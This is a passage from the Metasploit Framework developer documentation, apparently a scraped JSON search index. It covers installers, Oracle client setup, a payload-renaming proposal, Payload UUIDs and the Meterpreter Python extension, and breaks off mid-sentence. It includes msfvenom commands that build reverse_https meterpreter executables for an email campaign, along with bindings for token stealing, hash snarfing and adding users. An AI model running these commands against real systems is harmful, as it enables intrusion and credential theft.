http://r-7.co/trymsp ] msf > Expand manual installation instructions ### Linux manual installation Linux packages are built nightly for .deb (i386, amd64, armhf, arm64) and .rpm (64-bit x86) systems. Debian/Ubuntu packages are available at https://apt.metasploit.com and CentOS/Redhat/Fedora packages are located at https://rpm.metasploit.com. ### OS X manual installation The latest OS X installer package can also be downloaded directly here: https://osx.metasploit.com/metasploitframework-latest.pkg, with the last 10 builds archived at https://osx.metasploit.com/. Simply download and launch the installer to install Metaploit Framework with all of its dependencies. Once installed, initially launch msfconsole as ```/opt/metasploit-framework/bin/msfconsole``` from a terminal console. A series of prompts will help you setup a database and add Metasploit to your local PATH. You can also follow the quick-installation instructions above to install in a single step. Windows ## Installing Metasploit on Windows Download the [latest Windows installer](https://windows.metasploit.com/metasploitframework-latest.msi) or [view older builds](https://windows.metasploit.com/). To install, simply download the .msi package, adjust your Antivirus as-needed to ignore c:\\metasploit-framework, double-click and enjoy. The msfconsole command and all related tools will be added to the system %PATH% environment variable. ### Windows Anti-virus software flags the contents of these packages! If you downloaded Metasploit from us, there is no cause for alarm. We pride ourselves on offering the ability for our customers and followers to have the same toolset that the hackers have so that they can test systems more accurately. Because these (and the other exploits and tools in Metasploit) are identical or very similar to existing malicious toolsets, they can be used for nefarious purposes, and they are often flagged and automatically removed by antivirus programs, just like the malware they mimic. ## Improving these installers Feel free to review and help improve [the source code for our installers](https://github.com/rapid7/metasploit-omnibus).","title":"What operating system are you using?"},{"location":"dev/dark/Oracle-Usage/","text":"Install oracle InstantClient InstantClient 10 is recommneded to allow you to talk with 8,9,10,&11 server versions. Go to http://www.oracle.com/technology/software/tech/oci/instantclient/index.html Grab these: * Instant Client Package - Basic * Instant Client Package - SDK (devel) * Instant Client Package - SQL*Plus (not needed for Metasploit but useful to have) unzip into /opt/oracle cd /opt/oracle unzip /opt/oracle/oracle-instantclient-basic-10.2.0.4-1.i386.zip unzip /opt/oracle/oracle-instantclient-sqlplus-10.2.0.4-1.i386.zip unzip /opt/oracle/oracle-instantclient-devel-10.2.0.4-1.i386.zip Now set up a symlink so the gem installation can find the right lib: ln -s libclntsh.so.10.1 libclntsh.so Set up your environment You can either create .sh file to make the appropriate changes when you need it or just add it to your .bashrc export PATH = $PATH :/opt/oracle/instantclient_10_2 export SQLPATH = /opt/oracle/instantclient_10_2 export TNS_ADMIN = /opt/oracle/instantclient_10_2 export LD_LIBRARY_PATH = /opt/oracle/instantclient_10_2 export ORACLE_HOME = /opt/oracle/instantclient_10_2 Additional steps for Kali Linux If you are using Kali Linux, you need to perform a couple of additional steps before the Oracle client gem will build properly. First, set your path to prefer the correct version of ruby so that Metasploit can use it: root@kali:~/ruby-oci8-ruby-oci8-2.1.8# export PATH=/opt/metasploit/ruby/bin:$PATH Next, install libgmp (needed to build the gem): root@kali:~/ruby-oci8-ruby-oci8-2.1.8# apt-get install libgmp-dev Reading package lists... Done Building dependency tree Reading state information... Done Suggested packages: libgmp10-doc libmpfr-dev The following NEW packages will be installed: libgmp-dev 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 0 B/610 kB of archives. After this operation, 1,740 kB of additional disk space will be used. Selecting previously unselected package libgmp-dev:amd64. (Reading database ... 322643 files and directories currently installed.) Unpacking libgmp-dev:amd64 (from .../libgmp-dev_2%3a5.0.5+dfsg-2_amd64.deb) ... Setting up libgmp-dev:amd64 (2:5.0.5+dfsg-2) ... Install the gem Back in your Metasploit directory, copy Gemfile.local.example to Gemfile.local , then add the following line to the :local group gem 'ruby-oci8' Update gems: bundle --gemfile Gemfile.local","title":"Install oracle InstantClient"},{"location":"dev/dark/Oracle-Usage/#install-oracle-instantclient","text":"InstantClient 10 is recommneded to allow you to talk with 8,9,10,&11 server versions. Go to http://www.oracle.com/technology/software/tech/oci/instantclient/index.html Grab these: * Instant Client Package - Basic * Instant Client Package - SDK (devel) * Instant Client Package - SQL*Plus (not needed for Metasploit but useful to have) unzip into /opt/oracle cd /opt/oracle unzip /opt/oracle/oracle-instantclient-basic-10.2.0.4-1.i386.zip unzip /opt/oracle/oracle-instantclient-sqlplus-10.2.0.4-1.i386.zip unzip /opt/oracle/oracle-instantclient-devel-10.2.0.4-1.i386.zip Now set up a symlink so the gem installation can find the right lib: ln -s libclntsh.so.10.1 libclntsh.so","title":"Install oracle InstantClient"},{"location":"dev/dark/Oracle-Usage/#set-up-your-environment","text":"You can either create .sh file to make the appropriate changes when you need it or just add it to your .bashrc export PATH = $PATH :/opt/oracle/instantclient_10_2 export SQLPATH = /opt/oracle/instantclient_10_2 export TNS_ADMIN = /opt/oracle/instantclient_10_2 export LD_LIBRARY_PATH = /opt/oracle/instantclient_10_2 export ORACLE_HOME = /opt/oracle/instantclient_10_2","title":"Set up your environment"},{"location":"dev/dark/Oracle-Usage/#additional-steps-for-kali-linux","text":"If you are using Kali Linux, you need to perform a couple of additional steps before the Oracle client gem will build properly. First, set your path to prefer the correct version of ruby so that Metasploit can use it: root@kali:~/ruby-oci8-ruby-oci8-2.1.8# export PATH=/opt/metasploit/ruby/bin:$PATH Next, install libgmp (needed to build the gem): root@kali:~/ruby-oci8-ruby-oci8-2.1.8# apt-get install libgmp-dev Reading package lists... Done Building dependency tree Reading state information... Done Suggested packages: libgmp10-doc libmpfr-dev The following NEW packages will be installed: libgmp-dev 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 0 B/610 kB of archives. After this operation, 1,740 kB of additional disk space will be used. Selecting previously unselected package libgmp-dev:amd64. (Reading database ... 322643 files and directories currently installed.) Unpacking libgmp-dev:amd64 (from .../libgmp-dev_2%3a5.0.5+dfsg-2_amd64.deb) ... Setting up libgmp-dev:amd64 (2:5.0.5+dfsg-2) ...","title":"Additional steps for Kali Linux"},{"location":"dev/dark/Oracle-Usage/#install-the-gem","text":"Back in your Metasploit directory, copy Gemfile.local.example to Gemfile.local , then add the following line to the :local group gem 'ruby-oci8' Update gems: bundle --gemfile Gemfile.local","title":"Install the gem"},{"location":"dev/dark/Payload-Rename-Justification/","text":"The Issue Many payloads perform the same task, yet have different names. This results in confusion and a bad new-user experience. Specifically, ARCH_CMD payloads differ greatly from their shellcode-derived brethren. For example, the most heavily used payload is windows/meterpreter/reverse_tcp ; the equivalent in ARCH_CMD land is cmd/unix/reverse , which gives no indication that the session type will be a shell. The Proposal I propose we rename all the aberrantly-named payloads to match the convention. Specifically: cmd/unix/bind_awk -> cmd/unix/shell_bind_tcp_awk cmd/unix/bind_lua -> cmd/unix/shell_bind_tcp_lua cmd/unix/bind_netcat -> cmd/unix/shell_bind_tcp_netcat cmd/unix/bind_netcat_gaping -> cmd/unix/shell_bind_tcp_netcat_gaping cmd/unix/bind_netcat_gaping_ipv6 -> cmd/unix/shell_bind_tcp_netcat_gaping_ipv6 cmd/unix/bind_nodejs -> cmd/unix/shell_bind_tcp_nodejs cmd/unix/bind_perl -> cmd/unix/shell_bind_tcp_perl cmd/unix/bind_perl_ipv6 -> cmd/unix/shell_bind_tcp_perl_ipv6 cmd/unix/bind_ruby -> cmd/unix/shell_bind_tcp_ruby cmd/unix/bind_ruby_ipv6 -> cmd/unix/shell_bind_tcp_ruby_ipv6 cmd/unix/bind_zsh -> cmd/unix/shell_bind_tcp_zsh cmd/unix/generic -> cmd/unix/exec cmd/unix/reverse -> cmd/unix/shell_reverse_tcp_telnet cmd/unix/reverse_awk -> cmd/unix/shell_reverse_tcp_awk cmd/unix/reverse_bash -> cmd/unix/shell_reverse_tcp_bash cmd/unix/reverse_bash_telnet_ssl -> cmd/unix/shell_reverse_tcp_bash_telnet_ssl cmd/unix/reverse_lua -> cmd/unix/shell_reverse_tcp_lua cmd/unix/reverse_netcat -> cmd/unix/shell_reverse_tcp_netcat cmd/unix/reverse_netcat_gaping -> cmd/unix/shell_reverse_tcp_netcat_gaping cmd/unix/reverse_nodejs -> cmd/unix/shell_reverse_tcp_nodejs cmd/unix/reverse_openssl -> cmd/unix/shell_reverse_tcp_openssl cmd/unix/reverse_perl -> cmd/unix/shell_reverse_tcp_perl cmd/unix/reverse_perl_ssl -> cmd/unix/shell_reverse_tcp_perl_ssl cmd/unix/reverse_php_ssl -> cmd/unix/shell_reverse_tcp_php_ssl cmd/unix/reverse_python -> cmd/unix/shell_reverse_tcp_python cmd/unix/reverse_python_ssl -> cmd/unix/shell_reverse_tcp_python_ssl cmd/unix/reverse_ruby -> cmd/unix/shell_reverse_tcp_ruby cmd/unix/reverse_ruby_ssl -> cmd/unix/shell_reverse_tcp_ruby_ssl cmd/unix/reverse_ssl_double_telnet -> cmd/unix/shell_reverse_tcp_ssl_double_telnet cmd/unix/reverse_zsh -> cmd/unix/shell_reverse_tcp_zsh cmd/windows/bind_lua -> cmd/windows/shell_bind_tcp_lua cmd/windows/bind_perl -> cmd/windows/shell_bind_tcp_perl cmd/windows/bind_perl_ipv6 -> cmd/windows/shell_bind_tcp_perl_ipv6 cmd/windows/bind_ruby -> cmd/windows/shell_bind_tcp_ruby cmd/windows/download_eval_vbs -> cmd/windows/download_eval_vbs cmd/windows/download_exec_vbs -> cmd/windows/download_exec_vbs cmd/windows/generic -> cmd/windows/exec cmd/windows/reverse_lua -> cmd/windows/shell_reverse_tcp_lua cmd/windows/reverse_perl -> cmd/windows/shell_reverse_tcp_perl cmd/windows/reverse_ruby -> cmd/windows/shell_reverse_tcp_ruby Difficulties Changing module names always entails a backwards compatibility issue. Experienced users are used to the old names and may be confused and annoyed by the change. This is mitigated somewhat by the fact that these payloads are probably used less often than other architectures, and thus users will have less ingrained muscle memory for them. It will break users' existing RC scripts that set payloads to any of the renamed modules. I think consistency across platforms and architectures is more important and will result in less confusion overall.","title":"Payload Rename Justification"},{"location":"dev/dark/Payload-Rename-Justification/#the-issue","text":"Many payloads perform the same task, yet have different names. This results in confusion and a bad new-user experience. Specifically, ARCH_CMD payloads differ greatly from their shellcode-derived brethren. For example, the most heavily used payload is windows/meterpreter/reverse_tcp ; the equivalent in ARCH_CMD land is cmd/unix/reverse , which gives no indication that the session type will be a shell.","title":"The Issue"},{"location":"dev/dark/Payload-Rename-Justification/#the-proposal","text":"I propose we rename all the aberrantly-named payloads to match the convention. Specifically: cmd/unix/bind_awk -> cmd/unix/shell_bind_tcp_awk cmd/unix/bind_lua -> cmd/unix/shell_bind_tcp_lua cmd/unix/bind_netcat -> cmd/unix/shell_bind_tcp_netcat cmd/unix/bind_netcat_gaping -> cmd/unix/shell_bind_tcp_netcat_gaping cmd/unix/bind_netcat_gaping_ipv6 -> cmd/unix/shell_bind_tcp_netcat_gaping_ipv6 cmd/unix/bind_nodejs -> cmd/unix/shell_bind_tcp_nodejs cmd/unix/bind_perl -> cmd/unix/shell_bind_tcp_perl cmd/unix/bind_perl_ipv6 -> cmd/unix/shell_bind_tcp_perl_ipv6 cmd/unix/bind_ruby -> cmd/unix/shell_bind_tcp_ruby cmd/unix/bind_ruby_ipv6 -> cmd/unix/shell_bind_tcp_ruby_ipv6 cmd/unix/bind_zsh -> cmd/unix/shell_bind_tcp_zsh cmd/unix/generic -> cmd/unix/exec cmd/unix/reverse -> cmd/unix/shell_reverse_tcp_telnet cmd/unix/reverse_awk -> cmd/unix/shell_reverse_tcp_awk cmd/unix/reverse_bash -> cmd/unix/shell_reverse_tcp_bash cmd/unix/reverse_bash_telnet_ssl -> cmd/unix/shell_reverse_tcp_bash_telnet_ssl cmd/unix/reverse_lua -> cmd/unix/shell_reverse_tcp_lua cmd/unix/reverse_netcat -> cmd/unix/shell_reverse_tcp_netcat cmd/unix/reverse_netcat_gaping -> cmd/unix/shell_reverse_tcp_netcat_gaping cmd/unix/reverse_nodejs -> cmd/unix/shell_reverse_tcp_nodejs cmd/unix/reverse_openssl -> cmd/unix/shell_reverse_tcp_openssl cmd/unix/reverse_perl -> cmd/unix/shell_reverse_tcp_perl cmd/unix/reverse_perl_ssl -> cmd/unix/shell_reverse_tcp_perl_ssl cmd/unix/reverse_php_ssl -> cmd/unix/shell_reverse_tcp_php_ssl cmd/unix/reverse_python -> cmd/unix/shell_reverse_tcp_python cmd/unix/reverse_python_ssl -> cmd/unix/shell_reverse_tcp_python_ssl cmd/unix/reverse_ruby -> cmd/unix/shell_reverse_tcp_ruby cmd/unix/reverse_ruby_ssl -> cmd/unix/shell_reverse_tcp_ruby_ssl cmd/unix/reverse_ssl_double_telnet -> cmd/unix/shell_reverse_tcp_ssl_double_telnet cmd/unix/reverse_zsh -> cmd/unix/shell_reverse_tcp_zsh cmd/windows/bind_lua -> cmd/windows/shell_bind_tcp_lua cmd/windows/bind_perl -> cmd/windows/shell_bind_tcp_perl cmd/windows/bind_perl_ipv6 -> cmd/windows/shell_bind_tcp_perl_ipv6 cmd/windows/bind_ruby -> cmd/windows/shell_bind_tcp_ruby cmd/windows/download_eval_vbs -> cmd/windows/download_eval_vbs cmd/windows/download_exec_vbs -> cmd/windows/download_exec_vbs cmd/windows/generic -> cmd/windows/exec cmd/windows/reverse_lua -> cmd/windows/shell_reverse_tcp_lua cmd/windows/reverse_perl -> cmd/windows/shell_reverse_tcp_perl cmd/windows/reverse_ruby -> cmd/windows/shell_reverse_tcp_ruby","title":"The Proposal"},{"location":"dev/dark/Payload-Rename-Justification/#difficulties","text":"Changing module names always entails a backwards compatibility issue. Experienced users are used to the old names and may be confused and annoyed by the change. This is mitigated somewhat by the fact that these payloads are probably used less often than other architectures, and thus users will have less ingrained muscle memory for them. It will break users' existing RC scripts that set payloads to any of the renamed modules. I think consistency across platforms and architectures is more important and will result in less confusion overall.","title":"Difficulties"},{"location":"dev/dark/Payload-UUID/","text":"In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The source code comments go into more detail. In the case of HTTP payloads, the 16-byte UUID value is encoded in base64url format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established. The goal of Payload UUIDs is three-fold: * Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing. * Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers. * Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures. Specifying the UUID Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the PayloadUUIDRaw option. This option takes a 8-byte hex string, such as \"0011223344556677\". For example: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe Tracking the UUID Payload UUIDs are enabled by default, but are not tracked unless the PayloadUUIDTracking option is set to true . Setting this option causes a new entry to be created in ~/.msf4/payloads.json when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the PayloadUUIDName . The example below will create a new registered payload with a custom name: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe $ cat ~/.msf4/payloads.json { \"68017d72958c40f6\": { \"arch\": \"x86\", \"platform\": \"windows\", \"timestamp\": 1435277049, \"payload\": \"payload/windows/meterpreter/reverse_https\", \"datastore\": {\"AutoLoadStdapi\":true,\"AutoRunScript\":\"\",\"AutoSystemInfo\":true,\"AutoVerifySession\":true,\"AutoVerifySessionTimeout\":30,\"EXITFUNC\":\"process\",\"EnableStageEncoding\":false,\"EnableUnicodeEncoding\":false,\"HttpUnknownRequestResponse\":\"\\u003Chtml\\u003E\\u003Cbody\\u003E\\u003Ch1\\u003EIt works!\\u003C/h1\\u003E\\u003C/body\\u003E\\u003C/html\\u003E\",\"IgnoreUnknownPayloads\":false,\"InitialAutoRunScript\":\"\",\"LHOST\":\"127.1.1.1\",\"LPORT\":4444,\"MeterpreterServerName\":\"Apache\",\"MeterpreterUserAgent\":\"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\",\"OverrideRequestHost\":false,\"PAYLOADUUIDNAME\":\"EmailCampaign20150101\",\"PayloadProxyPort\":0,\"PayloadProxyType\":\"HTTP\",\"PayloadUUIDTracking\":true,\"PrependMigrate\":false,\"ReverseListenerBindPort\":0,\"SessionCommunicationTimeout\":300,\"SessionExpirationTimeout\":604800,\"SessionRetryTotal\":3600,\"SessionRetryWait\":10,\"StageEncoderSaveRegisters\":\"\",\"StageEncodingFallback\":true,\"StagerRetryCount\":10,\"StagerURILength\":0,\"StagerVerifySSLCert\":false,\"VERBOSE\":false}, \"name\": \"EmailCampaign20150101\", \"urls\": [ \"/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi\" ] } } Once this payload is launched, the output of the sessions -l -v command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID: ``` msf exploit(handler) > run -j [ ] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ... [ ] Meterpreter session 1 opened (127.1.1.1:4444 -> 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700 msf exploit(handler) > sessions -l -v Active sessions Session ID: 1 Type: meterpreter x86/win32 Info: fang\\hdm @ fang Tunnel: 127.1.1.1:4444 -> 127.0.0.1:36235 (127.0.0.1) Via: exploit/multi/handler UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700 Registered: Yes - Name=\"EmailCampaign20150101\" ``` Whitelisting UUIDs The ~/.msf4/payloads.json file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting, set the IgnoreUnknownPayloads option to true in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The payloads.json file can be copied between Metasploit Framework instances and even hand-edited while the framework is running.","title":"Payload UUID"},{"location":"dev/dark/Payload-UUID/#specifying-the-uuid","text":"Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the PayloadUUIDRaw option. This option takes a 8-byte hex string, such as \"0011223344556677\". For example: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe","title":"Specifying the UUID"},{"location":"dev/dark/Payload-UUID/#tracking-the-uuid","text":"Payload UUIDs are enabled by default, but are not tracked unless the PayloadUUIDTracking option is set to true . Setting this option causes a new entry to be created in ~/.msf4/payloads.json when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the PayloadUUIDName . The example below will create a new registered payload with a custom name: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe $ cat ~/.msf4/payloads.json { \"68017d72958c40f6\": { \"arch\": \"x86\", \"platform\": \"windows\", \"timestamp\": 1435277049, \"payload\": \"payload/windows/meterpreter/reverse_https\", \"datastore\": {\"AutoLoadStdapi\":true,\"AutoRunScript\":\"\",\"AutoSystemInfo\":true,\"AutoVerifySession\":true,\"AutoVerifySessionTimeout\":30,\"EXITFUNC\":\"process\",\"EnableStageEncoding\":false,\"EnableUnicodeEncoding\":false,\"HttpUnknownRequestResponse\":\"\\u003Chtml\\u003E\\u003Cbody\\u003E\\u003Ch1\\u003EIt works!\\u003C/h1\\u003E\\u003C/body\\u003E\\u003C/html\\u003E\",\"IgnoreUnknownPayloads\":false,\"InitialAutoRunScript\":\"\",\"LHOST\":\"127.1.1.1\",\"LPORT\":4444,\"MeterpreterServerName\":\"Apache\",\"MeterpreterUserAgent\":\"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\",\"OverrideRequestHost\":false,\"PAYLOADUUIDNAME\":\"EmailCampaign20150101\",\"PayloadProxyPort\":0,\"PayloadProxyType\":\"HTTP\",\"PayloadUUIDTracking\":true,\"PrependMigrate\":false,\"ReverseListenerBindPort\":0,\"SessionCommunicationTimeout\":300,\"SessionExpirationTimeout\":604800,\"SessionRetryTotal\":3600,\"SessionRetryWait\":10,\"StageEncoderSaveRegisters\":\"\",\"StageEncodingFallback\":true,\"StagerRetryCount\":10,\"StagerURILength\":0,\"StagerVerifySSLCert\":false,\"VERBOSE\":false}, \"name\": \"EmailCampaign20150101\", \"urls\": [ \"/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi\" ] } } Once this payload is launched, the output of the sessions -l -v command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID: ``` msf exploit(handler) > run -j [ ] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ... [ ] Meterpreter session 1 opened (127.1.1.1:4444 -> 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700 msf exploit(handler) > sessions -l -v","title":"Tracking the UUID"},{"location":"dev/dark/Payload-UUID/#active-sessions","text":"Session ID: 1 Type: meterpreter x86/win32 Info: fang\\hdm @ fang Tunnel: 127.1.1.1:4444 -> 127.0.0.1:36235 (127.0.0.1) Via: exploit/multi/handler UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700 Registered: Yes - Name=\"EmailCampaign20150101\" ```","title":"Active sessions"},{"location":"dev/dark/Payload-UUID/#whitelisting-uuids","text":"The ~/.msf4/payloads.json file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting, set the IgnoreUnknownPayloads option to true in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The payloads.json file can be copied between Metasploit Framework instances and even hand-edited while the framework is running.","title":"Whitelisting UUIDs"},{"location":"dev/dark/Powershell-Extension/","text":"I'm yet to get the documentation done for this extension, but in the mean time there's some useful information in the original payloads pull request that shows how it can be used (including bindings). I promise to get more detail here soon!","title":"Powershell Extension"},{"location":"dev/dark/Python-Extension/","text":"Introduction For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn't really give them the ability to script the client in a single-shot. Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not all ) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of ctypes for easy automation of Win32-related functions. We've even taken steps to make this extension piggy-back onto metsrv 's copy of the SSL libraries in an effort to reduce the size of the resulting binary. This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up. Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time. Usage As with any other extension that comes with Meterpreter, loading it is very simple: meterpreter > use python Loading extension python...success. Once loaded, the help system shows the commands that come with the extension: meterpreter > help ... snip ... Python Commands =============== Command Description ------- ----------- python_execute Execute a python command string python_import Import/run a python file or module python_reset Resets/restarts the Python interpreter Each of these commands is discussed in detail below. python_execute The python_execute command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the -c switch. The full help for the command is as follows: meterpreter > python_execute -h Usage: python_execute <python code> [-r result var name] Runs the given python string on the target. If a result is required, it should be stored in a python variable, and that variable should passed using the -r parameter. OPTIONS: -h Help banner -r <opt> Name of the variable containing the result (optional) A very simple example of this command is shown below: meterpreter > python_execute \"print 'Hi, from Meterpreter!'\" [+] Content written to stdout: Hi, from Meterpreter! Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it's visible to the user. This also happens for anything written to stderr, as shown below: meterpreter > python_execute \"x = x + 1\" [-] Content written to stderr: Traceback (most recent call last): File \"<string>\", line 1, in <module> NameError: name 'x' is not defined This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too. A more interesting example can be seen below: meterpreter > python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" [+] Command executed without returning a result The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured. The good thing is that the Python extension is persistant across calls. This means that after the above command is executed, x is still present in the interpreter and can be accessed with another call: meterpreter > python_execute \"print x\" [+] Content written to stdout: [0, 5, 10, 15] As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the -r paramter, as described by the help: meterpreter > python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" -r x [+] x = [0, 5, 10, 15] Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the -r parameter: meterpreter > python_execute \"\" -r x [+] x = [0, 5, 10, 15] Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the -r parameter. Sometimes, single-line execution isn't enough, or is cumbersome. The python_import command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk. python_import This command allows for whole modules to be loaded from the attacker's machine an uploaded to the target interpreter. The full help is shown below: meterpreter > python_import -h Usage: python_import <-f file path> [-n mod name] [-r result var name] Loads a python code file or module from disk into memory on the target. The module loader requires a path to a folder that contains the module, and the folder name will be used as the module name. Only .py files will work with modules. OPTIONS: -f <opt> Path to the file (.py, .pyc), or module directory to import -h Help banner -n <opt> Name of the module (optional, for single files only) -r <opt> Name of the variable containing the result (optional, single files only) Importing of module trees is still considered a beta feature, but we encourage you to use it where possible and keep us informed of any issues you may face. Consider the following script: $ cat /tmp/drives.py import string from ctypes import windll def get_drives(): drives = [] bitmask = windll.kernel32.GetLogicalDrives() for letter in string.uppercase: if bitmask & 1: drives.append(letter) bitmask >>= 1 return drives result = get_drives() print result The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows: meterpreter > python_import -f /tmp/drives.py [*] Importing /tmp/drives.py ... [+] Content written to stdout: ['A', 'C', 'D', 'Z'] This shows that ctypes does indeed function correctly! This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area. python_reset It may get to a point where the content of the interpreter needs to be flushed. The python_reset command clears out all imports, libraries and global variables: meterpreter > python_execute \"x = 100\" [+] Command executed without returning a result meterpreter > python_execute \"print x\" [+] Content written to stdout: 100 meterpreter > python_reset [+] Python interpreter successfully reset meterpreter > python_execute \"print x\" [-] Content written to stderr: Traceback (most recent call last): File \"<string>\", line 1, in <module> NameError: name 'x' is not defined Meterpreter Bindings A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly. Binding list meterpreter.elevate meterpreter.elevate.getsystem() - maps directly to the getsystem command, however only attempts to use technique 1 because this is the only technique that doesn't require a binary to be uploaded. meterpreter.elevate.rev2self() - maps directly to the rev2self command. meterpreter.elevate.steal_token(pid) - provides the ability to steal a token from another process. pid - the identifier of the process to steal the token from. meterpreter.elevate.drop_token() - drops the token that was stolen using steal_token . meterpreter.extapi (requires the extapi extension) Each of the following functions takes the following parameters: domain_name - the name of the domain that will be enumerated. max_results - maximum number of results (default None ). page_size - the size of the results page (default None ). The full list of available functions is as follows: meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size) - enumerate the domain controllers on the given domain. meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size) - enumerate users on the given domain. meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size) - enumerate users in the given group recursively. group_dn - The distinguished name of the group to enumerate. meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size) - enumerate computers on the given domain. meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size) - provides a generic query mechanism to ADSI. All other functions in this library make use of this function. query_filter - the LDAP-formatted query filter for the query. fields - list of fields to extract from the query results. meterpreter.fs meterpreter.fs.show_mount() - maps to the show_mount command and lists all logical drives on the target. meterpreter.incognito (requires the incognito extension) meterpreter.incognito.list_user_tokens() - list all available user tokens. meterpreter.incognito.list_group_tokens() - list all available group tokens. meterpreter.incognito.impersonate(user) - impersonate the given user. user - name of the user/group to impersonate in DOMAIN\\user format. meterpreter.incognito.snarf_hashes(server) - run the snarf_hashes functionality using the specified server. server - name of the server that is in place and ready to snarf the hashes. meterpreter.incognito.add_user(server, username, password) - add a user to the given server. server - 